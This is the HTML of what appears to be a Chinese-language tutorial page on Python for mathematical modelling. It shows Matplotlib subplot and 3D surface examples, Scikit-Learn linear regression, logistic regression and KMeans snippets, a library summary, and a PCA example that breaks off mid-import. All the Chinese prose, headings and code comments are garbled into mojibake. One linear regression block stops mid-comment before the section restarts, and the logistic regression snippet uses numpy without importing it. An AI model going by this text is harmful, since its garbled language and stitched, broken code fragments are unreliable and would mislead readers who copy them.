ç»˜åˆ¶å¤šä¸ªå­å›¾"></a><strong>4.1 ç»˜åˆ¶å¤šä¸ªå­å›¾</strong></h3><p>åœ¨å®é™…åˆ†æä¸­ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦ç»˜åˆ¶å¤šä¸ªå­å›¾æ¥å±•ç¤ºä¸åŒçš„æ•°æ®å…³ç³»ã€‚<strong>Matplotlib</strong> æä¾›äº†éå¸¸æ–¹ä¾¿çš„æ¥å£æ¥åˆ›å»ºå­å›¾ã€‚</p><h4 id="å®ä¾‹ï¼šåˆ›å»ºå¤šä¸ªå­å›¾"><a href="#å®ä¾‹ï¼šåˆ›å»ºå¤šä¸ªå­å›¾" class="headerlink" title="å®ä¾‹ï¼šåˆ›å»ºå¤šä¸ªå­å›¾"></a><strong>å®ä¾‹ï¼šåˆ›å»ºå¤šä¸ªå­å›¾</strong></h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import matplotlib.pyplot as plt<br>import numpy as np<br><br><span class="hljs-comment"># åˆ›å»ºæ•°æ®</span><br>x = np.linspace(0, 10, 100)<br>y1 = np.sin(x)<br>y2 = np.cos(x)<br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ª 1x2 çš„å­å›¾</span><br>fig, ax = plt.subplots(1, 2, figsize=(10, 4))<br><br><span class="hljs-comment"># ç»˜åˆ¶ç¬¬ä¸€ä¸ªå­å›¾ï¼šsin(x)</span><br>ax[0].plot(x, y1, <span class="hljs-attribute">label</span>=<span class="hljs-string">&#x27;sin(x)&#x27;</span>, <span class="hljs-attribute">color</span>=<span class="hljs-string">&#x27;r&#x27;</span>)<br>ax[0].set_title(<span class="hljs-string">&#x27;Sine Function&#x27;</span>)<br>ax[0].legend()<br><br><span class="hljs-comment"># ç»˜åˆ¶ç¬¬äºŒä¸ªå­å›¾ï¼šcos(x)</span><br>ax[1].plot(x, y2, <span class="hljs-attribute">label</span>=<span class="hljs-string">&#x27;cos(x)&#x27;</span>, <span class="hljs-attribute">color</span>=<span class="hljs-string">&#x27;b&#x27;</span>)<br>ax[1].set_title(<span class="hljs-string">&#x27;Cosine Function&#x27;</span>)<br>ax[1].legend()<br><br>plt.tight_layout()<br>plt.show()<br></code></pre></td></tr></table></figure><h3 id="4-2-3D-å¯è§†åŒ–"><a href="#4-2-3D-å¯è§†åŒ–" class="headerlink" title="4.2 3D å¯è§†åŒ–"></a><strong>4.2 3D å¯è§†åŒ–</strong></h3><p>å¦‚æœæ•°æ®æ˜¯ä¸‰ç»´çš„ï¼Œ<strong>Matplotlib</strong> æä¾›äº† 3D å›¾å½¢æ”¯æŒæ¥è¿›è¡Œå¯è§†åŒ–ã€‚</p><h4 id="å®ä¾‹ï¼š3D-æ›²é¢å›¾"><a href="#å®ä¾‹ï¼š3D-æ›²é¢å›¾" class="headerlink" title="å®ä¾‹ï¼š3D æ›²é¢å›¾"></a><strong>å®ä¾‹ï¼š3D æ›²é¢å›¾</strong></h4><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gml">from mpl_toolkits.mplot3d import Axes3D<br><br># åˆ›å»ºæ•°æ®<br><span class="hljs-variable language_">x</span> = np.linspace(<span class="hljs-number">-5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">100</span>)<br><span class="hljs-variable language_">y</span> = np.linspace(<span class="hljs-number">-5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">100</span>)<br><span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span> = np.meshgrid(<span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span>)<br>z = np.<span class="hljs-built_in">sin</span>(np.<span class="hljs-built_in">sqrt</span>(<span class="hljs-variable language_">x</span>**<span class="hljs-number">2</span> + <span class="hljs-variable language_">y</span>**<span class="hljs-number">2</span>))<br><br># åˆ›å»º <span class="hljs-number">3</span>D å›¾<br>fig = plt.figure()<br>ax = fig.add_subplot(<span class="hljs-number">111</span>, projection=<span class="hljs-string">&#x27;3d&#x27;</span>)<br>ax.plot_surface(<span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span>, z, cmap=<span class="hljs-string">&#x27;viridis&#x27;</span>)<br><br>ax.set_title(<span class="hljs-string">&#x27;3D Surface Plot&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><hr><h2 id="5-Scikit-Learnï¼šæœºå™¨å­¦ä¹ åº“"><a href="#5-Scikit-Learnï¼šæœºå™¨å­¦ä¹ åº“" class="headerlink" title="5. Scikit-Learnï¼šæœºå™¨å­¦ä¹ åº“"></a><strong>5. Scikit-Learnï¼šæœºå™¨å­¦ä¹ åº“</strong></h2><h3 id="5-1-çº¿æ€§å›å½’"><a href="#5-1-çº¿æ€§å›å½’" class="headerlink" title="5.1 çº¿æ€§å›å½’"></a><strong>5.1 çº¿æ€§å›å½’</strong></h3><p><strong>Scikit-Learn</strong> æä¾›äº†è®¸å¤šç»å…¸æœºå™¨å­¦ä¹ ç®—æ³•ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬å¸¸ç”¨çº¿æ€§å›å½’æ¥é¢„æµ‹è¿ç»­å€¼ã€‚</p><h4 id="å®ä¾‹ï¼šçº¿æ€§å›å½’"><a href="#å®ä¾‹ï¼šçº¿æ€§å›å½’" class="headerlink" title="å®ä¾‹ï¼šçº¿æ€§å›å½’"></a><strong>å®ä¾‹ï¼šçº¿æ€§å›å½’</strong></h4><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> <span class="hljs-type">LinearRegression</span><br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> mean_squared_error<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># åˆ›å»ºç¤ºä¾‹æ•°æ®</span><br>X = np.<span class="hljs-type">array</span>([[<span class="hljs-number">1</span>], [<span class="hljs-number">2</span>], [<span class="hljs-number">3</span>], [<span class="hljs-number">4</span>], [<span class="hljs-number">5</span>]])<br>y = np.<span class="hljs-type">array</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>])<br><br><span class="hljs-comment"># æ•°æ®æ‹†</span><br></code></pre></td></tr></table></figure><h2 id="5-Scikit-Learnï¼šæœºå™¨å­¦ä¹ åº“ï¼ˆç»­ï¼‰"><a href="#5-Scikit-Learnï¼šæœºå™¨å­¦ä¹ åº“ï¼ˆç»­ï¼‰" class="headerlink" title="5. Scikit-Learnï¼šæœºå™¨å­¦ä¹ åº“ï¼ˆç»­ï¼‰"></a><strong>5. Scikit-Learnï¼šæœºå™¨å­¦ä¹ åº“ï¼ˆç»­ï¼‰</strong></h2><h3 id="5-1-çº¿æ€§å›å½’ï¼ˆç»­ï¼‰"><a href="#5-1-çº¿æ€§å›å½’ï¼ˆç»­ï¼‰" class="headerlink" title="5.1 çº¿æ€§å›å½’ï¼ˆç»­ï¼‰"></a><strong>5.1 çº¿æ€§å›å½’ï¼ˆç»­ï¼‰</strong></h3><p>çº¿æ€§å›å½’æ˜¯ä¸€ä¸ªç®€å•ä¸”å¹¿æ³›ä½¿ç”¨çš„ç®—æ³•ï¼Œåœ¨å¾ˆå¤šå®é™…åº”ç”¨ä¸­è¢«ç”¨æ¥è¿›è¡Œé¢„æµ‹ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªåŸºäº Scikit-Learn çš„çº¿æ€§å›å½’å®ä¾‹ã€‚</p><h4 id="å®ä¾‹ï¼šçº¿æ€§å›å½’é¢„æµ‹"><a href="#å®ä¾‹ï¼šçº¿æ€§å›å½’é¢„æµ‹" class="headerlink" title="å®ä¾‹ï¼šçº¿æ€§å›å½’é¢„æµ‹"></a><strong>å®ä¾‹ï¼šçº¿æ€§å›å½’é¢„æµ‹</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LinearRegression<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> mean_squared_error<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># åˆ›å»ºç¤ºä¾‹æ•°æ®</span><br>X = np.array([[<span class="hljs-number">1</span>], [<span class="hljs-number">2</span>], [<span class="hljs-number">3</span>], [<span class="hljs-number">4</span>], [<span class="hljs-number">5</span>]])  <span class="hljs-comment"># ç‰¹å¾ï¼šX</span><br>y = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>])  <span class="hljs-comment"># æ ‡ç­¾ï¼šy</span><br><br><span class="hljs-comment"># åˆ’åˆ†è®­ç»ƒé›†å’Œæµ‹è¯•é›†</span><br>X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0.2</span>, random_state=<span class="hljs-number">42</span>)<br><br><span class="hljs-comment"># åˆ›å»ºå¹¶è®­ç»ƒçº¿æ€§å›å½’æ¨¡å‹</span><br>model = LinearRegression()<br>model.fit(X_train, y_train)<br><br><span class="hljs-comment"># ç”¨æµ‹è¯•é›†è¿›è¡Œé¢„æµ‹</span><br>y_pred = model.predict(X_test)<br><br><span class="hljs-comment"># è¾“å‡ºé¢„æµ‹ç»“æœä¸çœŸå®å€¼</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;é¢„æµ‹ç»“æœï¼š&quot;</span>, y_pred)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;çœŸå®å€¼ï¼š&quot;</span>, y_test)<br><br><span class="hljs-comment"># è®¡ç®—å‡æ–¹è¯¯å·®</span><br>mse = mean_squared_error(y_test, y_pred)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å‡æ–¹è¯¯å·®ï¼š<span class="hljs-subst">&#123;mse&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>è¯´æ˜</strong>ï¼š</p><ul><li><code>train_test_split</code> ç”¨äºå°†æ•°æ®æ‹†åˆ†æˆè®­ç»ƒé›†å’Œæµ‹è¯•é›†ã€‚</li><li><code>LinearRegression</code> ç”¨äºå»ºç«‹å›å½’æ¨¡å‹ã€‚</li><li><code>mean_squared_error</code> ç”¨äºè¯„ä¼°æ¨¡å‹çš„æ•ˆæœã€‚</li></ul><h3 id="5-2-åˆ†ç±»ï¼šé€»è¾‘å›å½’ï¼ˆLogistic-Regressionï¼‰"><a href="#5-2-åˆ†ç±»ï¼šé€»è¾‘å›å½’ï¼ˆLogistic-Regressionï¼‰" class="headerlink" title="5.2 åˆ†ç±»ï¼šé€»è¾‘å›å½’ï¼ˆLogistic Regressionï¼‰"></a><strong>5.2 åˆ†ç±»ï¼šé€»è¾‘å›å½’ï¼ˆLogistic Regressionï¼‰</strong></h3><p>é€»è¾‘å›å½’å¹¿æ³›åº”ç”¨äºäºŒåˆ†ç±»é—®é¢˜ï¼Œå¦‚ç–¾ç—…é¢„æµ‹ã€é‡‘èæ¬ºè¯ˆæ£€æµ‹ç­‰ã€‚</p><h4 id="å®ä¾‹ï¼šé€»è¾‘å›å½’åˆ†ç±»"><a href="#å®ä¾‹ï¼šé€»è¾‘å›å½’åˆ†ç±»" class="headerlink" title="å®ä¾‹ï¼šé€»è¾‘å›å½’åˆ†ç±»"></a><strong>å®ä¾‹ï¼šé€»è¾‘å›å½’åˆ†ç±»</strong></h4><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> <span class="hljs-type">LogisticRegression</span><br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> accuracy_score<br><br><span class="hljs-comment"># åˆ›å»ºç¤ºä¾‹æ•°æ®</span><br>X = np.<span class="hljs-type">array</span>([[<span class="hljs-number">1</span>], [<span class="hljs-number">2</span>], [<span class="hljs-number">3</span>], [<span class="hljs-number">4</span>], [<span class="hljs-number">5</span>], [<span class="hljs-number">6</span>], [<span class="hljs-number">7</span>], [<span class="hljs-number">8</span>], [<span class="hljs-number">9</span>], [<span class="hljs-number">10</span>]])  <span class="hljs-comment"># ç‰¹å¾ï¼šX</span><br>y = np.<span class="hljs-type">array</span>([<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>])  <span class="hljs-comment"># æ ‡ç­¾ï¼šyï¼Œ0 å’Œ 1 çš„äºŒåˆ†ç±»</span><br><br><span class="hljs-comment"># åˆ’åˆ†è®­ç»ƒé›†å’Œæµ‹è¯•é›†</span><br><span class="hljs-type">X_train</span>, <span class="hljs-type">X_test</span>, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>, random_state=<span class="hljs-number">42</span>)<br><br><span class="hljs-comment"># åˆ›å»ºå¹¶è®­ç»ƒé€»è¾‘å›å½’æ¨¡å‹</span><br>model = <span class="hljs-type">LogisticRegression</span>()<br>model.fit(<span class="hljs-type">X_train</span>, y_train)<br><br><span class="hljs-comment"># ç”¨æµ‹è¯•é›†è¿›è¡Œé¢„æµ‹</span><br>y_pred = model.predict(<span class="hljs-type">X_test</span>)<br><br><span class="hljs-comment"># è¾“å‡ºå‡†ç¡®ç‡</span><br>accuracy = accuracy_score(y_test, y_pred)<br>print(<span class="hljs-string">f&quot;åˆ†ç±»å‡†ç¡®ç‡ï¼š&#123;accuracy&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>è¯´æ˜</strong>ï¼š</p><ul><li><code>LogisticRegression</code> ç”¨äºäºŒåˆ†ç±»é—®é¢˜ã€‚</li><li><code>accuracy_score</code> ç”¨äºè®¡ç®—åˆ†ç±»æ¨¡å‹çš„å‡†ç¡®åº¦ã€‚</li></ul><h3 id="5-3-èšç±»ï¼šKMeans-èšç±»"><a href="#5-3-èšç±»ï¼šKMeans-èšç±»" class="headerlink" title="5.3 èšç±»ï¼šKMeans èšç±»"></a><strong>5.3 èšç±»ï¼šKMeans èšç±»</strong></h3><p>KMeans æ˜¯ä¸€ç§å¸¸ç”¨çš„æ— ç›‘ç£å­¦ä¹ ç®—æ³•ï¼Œç”¨äºå°†æ•°æ®åˆ’åˆ†æˆä¸åŒçš„ç±»åˆ«ã€‚</p><h4 id="å®ä¾‹ï¼šKMeans-èšç±»"><a href="#å®ä¾‹ï¼šKMeans-èšç±»" class="headerlink" title="å®ä¾‹ï¼šKMeans èšç±»"></a><strong>å®ä¾‹ï¼šKMeans èšç±»</strong></h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> sklearn.cluster import KMeans<br>import numpy as np<br>import matplotlib.pyplot as plt<br><br><span class="hljs-comment"># åˆ›å»ºç¤ºä¾‹æ•°æ®ï¼šä¸¤ä¸ªç‰¹å¾</span><br>X = np.array([[1, 2], [2, 3], [3, 4], [10, 11], [11, 12], [12, 13]])<br><br><span class="hljs-comment"># åˆ›å»º KMeans æ¨¡å‹ï¼Œè®¾ç½®ä¸º 2 ä¸ªèšç±»ä¸­å¿ƒ</span><br>kmeans = KMeans(<span class="hljs-attribute">n_clusters</span>=2, <span class="hljs-attribute">random_state</span>=42)<br><br><span class="hljs-comment"># è®­ç»ƒæ¨¡å‹</span><br>kmeans.fit(X)<br><br><span class="hljs-comment"># é¢„æµ‹æ¯ä¸ªç‚¹çš„èšç±»æ ‡ç­¾</span><br>labels = kmeans.predict(X)<br><br><span class="hljs-comment"># æ‰“å°èšç±»ä¸­å¿ƒ</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;èšç±»ä¸­å¿ƒï¼š&quot;</span>, kmeans.cluster_centers_)<br><br><span class="hljs-comment"># å¯è§†åŒ–èšç±»ç»“æœ</span><br>plt.scatter(X[:, 0], X[:, 1], <span class="hljs-attribute">c</span>=labels, <span class="hljs-attribute">cmap</span>=<span class="hljs-string">&#x27;viridis&#x27;</span>)<br>plt.scatter(kmeans.cluster_centers_[:, 0], kmeans.cluster_centers_[:, 1], <span class="hljs-attribute">marker</span>=<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-attribute">color</span>=<span class="hljs-string">&#x27;red&#x27;</span>, <span class="hljs-attribute">s</span>=200)<br>plt.title(<span class="hljs-string">&quot;KMeans èšç±»&quot;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p><strong>è¯´æ˜</strong>ï¼š</p><ul><li><code>KMeans</code> ç”¨äºè¿›è¡Œèšç±»åˆ†æã€‚</li><li><code>cluster_centers_</code> å­˜å‚¨èšç±»ä¸­å¿ƒçš„åæ ‡ã€‚</li><li>ä½¿ç”¨ <code>matplotlib</code> å¯è§†åŒ–èšç±»ç»“æœã€‚</li></ul><hr><h2 id="æ€»ç»“ï¼šå¦‚ä½•å°†-Python-åº“åº”ç”¨äºæ•°å­¦å»ºæ¨¡å’Œæ•°æ®åˆ†æ"><a href="#æ€»ç»“ï¼šå¦‚ä½•å°†-Python-åº“åº”ç”¨äºæ•°å­¦å»ºæ¨¡å’Œæ•°æ®åˆ†æ" class="headerlink" title="æ€»ç»“ï¼šå¦‚ä½•å°† Python åº“åº”ç”¨äºæ•°å­¦å»ºæ¨¡å’Œæ•°æ®åˆ†æ"></a><strong>æ€»ç»“ï¼šå¦‚ä½•å°† Python åº“åº”ç”¨äºæ•°å­¦å»ºæ¨¡å’Œæ•°æ®åˆ†æ</strong></h2><p>ç»“åˆä¹‹å‰çš„ç¤ºä¾‹å’Œåº”ç”¨ï¼Œå¯ä»¥çœ‹åˆ° <strong>NumPy</strong>ã€<strong>SciPy</strong>ã€<strong>Pandas</strong>ã€<strong>Matplotlib</strong> å’Œ <strong>Scikit-Learn</strong> åœ¨æ•°å­¦å»ºæ¨¡å’Œæ•°æ®åˆ†æä¸­çš„åº”ç”¨éå¸¸å¹¿æ³›ã€‚è¿™äº›åº“ä¸ºæˆ‘ä»¬æä¾›äº†å¼ºå¤§çš„æ•°å€¼è®¡ç®—ã€æ•°æ®å¤„ç†ã€ç»Ÿè®¡åˆ†æã€æœºå™¨å­¦ä¹ å’Œæ•°æ®å¯è§†åŒ–çš„å·¥å…·ã€‚</p><ol><li><strong>NumPy</strong>ï¼šç”¨äºåŸºç¡€çš„æ•°ç»„æ“ä½œå’ŒçŸ©é˜µè¿ç®—ï¼Œåœ¨ä¼˜åŒ–é—®é¢˜ã€çº¿æ€§ä»£æ•°ã€æ•°å€¼è®¡ç®—ä¸­æ‰®æ¼”é‡è¦è§’è‰²ã€‚</li><li><strong>SciPy</strong>ï¼šæä¾›äº†é«˜çº§çš„æ•°å­¦è®¡ç®—åŠŸèƒ½ï¼Œå¦‚ä¼˜åŒ–ã€ç§¯åˆ†ã€æ’å€¼å’Œé«˜çº§çº¿æ€§ä»£æ•°ï¼Œå¯ä»¥è§£å†³å¤æ‚çš„æ•°å­¦å»ºæ¨¡é—®é¢˜ã€‚</li><li><strong>Pandas</strong>ï¼šç”¨äºæ•°æ®é¢„å¤„ç†ï¼Œç‰¹åˆ«æ˜¯å¤„ç†ç»“æ„åŒ–æ•°æ®ï¼ˆå¦‚ CSVã€Excel æ–‡ä»¶ç­‰ï¼‰ã€‚å®ƒè¿˜å…·æœ‰å¼ºå¤§çš„æ•°æ®æ¸…ç†ã€èšåˆå’Œé€è§†è¡¨åŠŸèƒ½ï¼Œéå¸¸é€‚åˆåšæ•°æ®åˆ†æã€‚</li><li><strong>Matplotlib</strong>ï¼šå¸®åŠ©æˆ‘ä»¬å¯è§†åŒ–æ•°æ®ï¼Œæ”¯æŒå„ç§ç±»å‹çš„å›¾è¡¨ï¼ŒåŒ…æ‹¬ 2D å’Œ 3D å›¾å½¢ï¼Œéå¸¸é€‚åˆç”¨äºåˆ†ææŠ¥å‘Šå’Œå±•ç¤ºæ•°æ®ã€‚</li><li><strong>Scikit-Learn</strong>ï¼šä¸ºæœºå™¨å­¦ä¹ æä¾›äº†ä¸€æ•´å¥—ç®—æ³•å’Œå·¥å…·ï¼Œé€‚ç”¨äºåˆ†ç±»ã€å›å½’ã€èšç±»ç­‰ä»»åŠ¡ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è¿›è¡Œå»ºæ¨¡å’Œé¢„æµ‹ã€‚</li></ol><h3 id="å®é™…åº”ç”¨ä¸­çš„å…¸å‹ä»»åŠ¡"><a href="#å®é™…åº”ç”¨ä¸­çš„å…¸å‹ä»»åŠ¡" class="headerlink" title="å®é™…åº”ç”¨ä¸­çš„å…¸å‹ä»»åŠ¡"></a><strong>å®é™…åº”ç”¨ä¸­çš„å…¸å‹ä»»åŠ¡</strong></h3><ul><li><strong>æ•°æ®æ¸…æ´—</strong>ï¼šä½¿ç”¨ <strong>Pandas</strong> å¤„ç†ç¼ºå¤±å€¼ã€é‡å¤æ•°æ®å’Œå¼‚å¸¸å€¼ã€‚</li><li><strong>æ•°æ®åˆ†æ</strong>ï¼šä½¿ç”¨ <strong>Pandas</strong> å’Œ <strong>NumPy</strong> å¯¹æ•°æ®è¿›è¡Œç»Ÿè®¡åˆ†æå’Œç‰¹å¾å·¥ç¨‹ã€‚</li><li><strong>æœºå™¨å­¦ä¹ å»ºæ¨¡</strong>ï¼šä½¿ç”¨ <strong>Scikit-Learn</strong> è¿›è¡Œå›å½’ã€åˆ†ç±»å’Œèšç±»å»ºæ¨¡ï¼Œè¿›è¡Œæ•°æ®æ‹Ÿåˆå’Œé¢„æµ‹ã€‚</li><li><strong>ä¼˜åŒ–</strong>ï¼šä½¿ç”¨ <strong>SciPy</strong> ä¼˜åŒ–å‡½æ•°è¿›è¡Œæ¨¡å‹å‚æ•°è°ƒæ•´ã€æœ€ä¼˜è§£æ±‚è§£ç­‰ã€‚</li><li><strong>æ•°æ®å¯è§†åŒ–</strong>ï¼šä½¿ç”¨ <strong>Matplotlib</strong> ç»˜åˆ¶å„ç§å›¾å½¢ï¼Œå¸®åŠ©ç†è§£æ•°æ®çš„åˆ†å¸ƒå’Œæ¨¡å‹æ•ˆæœã€‚</li></ul><h1 id="é¢˜å‹åˆ†ç±»"><a href="#é¢˜å‹åˆ†ç±»" class="headerlink" title="é¢˜å‹åˆ†ç±»"></a>é¢˜å‹åˆ†ç±»</h1><ul><li><h3 id="1-è¯„ä»·ç±»æ¨¡å‹"><a href="#1-è¯„ä»·ç±»æ¨¡å‹" class="headerlink" title="1. è¯„ä»·ç±»æ¨¡å‹"></a><strong>1. è¯„ä»·ç±»æ¨¡å‹</strong></h3><p>è¯„ä»·ç±»æ¨¡å‹ç”¨äºç»¼åˆåˆ†æå’Œè¯„ä¼°ç³»ç»Ÿæˆ–æ–¹æ¡ˆçš„ä¼˜åŠ£ï¼Œé€‚ç”¨äºå¤šç»´åº¦ã€å¤šæŒ‡æ ‡çš„å†³ç­–é—®é¢˜ã€‚</p><h4 id="å¸¸è§æ–¹æ³•ï¼š"><a href="#å¸¸è§æ–¹æ³•ï¼š" class="headerlink" title="å¸¸è§æ–¹æ³•ï¼š"></a><strong>å¸¸è§æ–¹æ³•</strong>ï¼š</h4><ul><li><p><strong>ä¸»æˆåˆ†åˆ†æï¼ˆPCAï¼‰</strong>ï¼š</p><ul><li><p><strong>åº”ç”¨å®ä¾‹</strong>ï¼šå‡è®¾ä½ æœ‰ä¸€ä¸ªæ¶‰åŠå¤šä¸ªç»´åº¦çš„æ¶ˆè´¹è€…æ»¡æ„åº¦è°ƒæŸ¥æ•°æ®ï¼ŒåŒ…å«äº§å“è´¨é‡ã€æœåŠ¡æ€åº¦ã€æ€§ä»·æ¯”ç­‰å¤šä¸ªæŒ‡æ ‡ã€‚é€šè¿‡PCAï¼Œå¯ä»¥å°†è¿™äº›å¤šä¸ªç»´åº¦çš„æŒ‡æ ‡é™åˆ°ä¸€ä¸ªæˆ–å‡ ä¸ªä¸»æˆåˆ†ï¼Œä»è€Œç®€åŒ–æ•°æ®ï¼Œå¹¶ä¿ç•™æœ€èƒ½åæ˜ å·®å¼‚çš„ä¿¡æ¯ï¼Œå¸®åŠ©å†³ç­–è€…æ›´æ¸…æ™°åœ°çœ‹åˆ°æ•°æ®çš„è¶‹åŠ¿å’Œç»“æ„ã€‚</p></li><li><p><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šä½ å¯ä»¥ä½¿ç”¨Pythonä¸­çš„<code>sklearn.decomposition.PCA</code>æ¥æ‰§è¡ŒPCAï¼Œé€‰æ‹©é€‚å½“çš„ä¸»æˆåˆ†æ•°ç›®ï¼Œå®Œæˆé™ç»´å¹¶åˆ†æå„ä¸»æˆåˆ†çš„æ–¹å·®è´¡çŒ®ç‡ã€‚</p></li><li><p>PCAç”¨äºæ•°æ®é™ç»´ï¼Œå¸¸ç”¨äºå‡å°‘ç‰¹å¾æ•°é‡ï¼ŒåŒæ—¶ä¿ç•™æ•°æ®çš„ä¸»è¦ä¿¡æ¯ã€‚</p></li><li><p><strong>ç¤ºä¾‹ï¼š</strong></p><p>å‡è®¾ä½ æœ‰ä¸€ä¸ªå…³äºå¤šä¸ªå±æ€§ï¼ˆå¦‚å¹´é¾„ã€æ”¶å…¥ã€æ•™è‚²ç¨‹åº¦ç­‰ï¼‰çš„é¡¾å®¢æ•°æ®ï¼Œä½ æƒ³é€šè¿‡PCAæ¥ç®€åŒ–æ•°æ®ï¼Œä¾¿äºåç»­åˆ†æã€‚</p></li></ul><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-title">from</span> sklearn.decomposition <span class="hljs-keyword">import</span> PCA<br><span class="hljs-title">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> 